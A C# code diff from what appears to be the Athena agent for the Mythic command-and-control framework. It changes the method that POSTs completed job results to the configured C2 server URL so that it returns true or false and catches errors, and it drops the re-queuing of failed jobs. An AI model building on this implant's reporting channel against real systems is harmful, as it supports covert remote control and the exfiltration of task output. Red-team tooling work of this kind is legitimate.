@@ -68,7 +68,7 @@ namespace Athena
             return gtr.tasks;
         }
 
-        public PostResponseResponse PostResponse(Dictionary<string,MythicJob> jobs)
+        public bool PostResponse(Dictionary<string,MythicJob> jobs)
         {
             List<ResponseResult> lrr = new List<ResponseResult>();
             foreach(var job in jobs.Values)
@@ -115,26 +115,21 @@ namespace Athena
                 responses = lrr
             };
 
-            //Do I need this for anything?
-            var responseString = SendPOST(this.MythicConfig.postURL, prr).Result;
-            CheckinResponse cs = JsonConvert.DeserializeObject<CheckinResponse>(Misc.Base64Decode(responseString).Substring(36));
-            if (cs.status != "success")
+            try
             {
-                foreach(var job in jobs)
+                var responseString = SendPOST(this.MythicConfig.postURL, prr).Result;
+                CheckinResponse cs = JsonConvert.DeserializeObject<CheckinResponse>(Misc.Base64Decode(responseString).Substring(36));
+                if (cs.status != "success")
                 {
-                    if (job.Value.complete)
-                    {
-                        Globals.jobs.Add(job.Key,job.Value);
-                    }
-                    else
-                    {
-                        //If taskoutput gets thrashed, it's likely due to this
-                        Globals.jobs[job.Key].taskresult = job.Value.taskresult + Globals.jobs[job.Key].taskresult;
-                    }
+                    return false;
                 }
             }
+            catch
+            {
+                return false;
+            }
 
-            return null;
+            return true;
         }
         private async Task<string> SendGET(string url)
         {
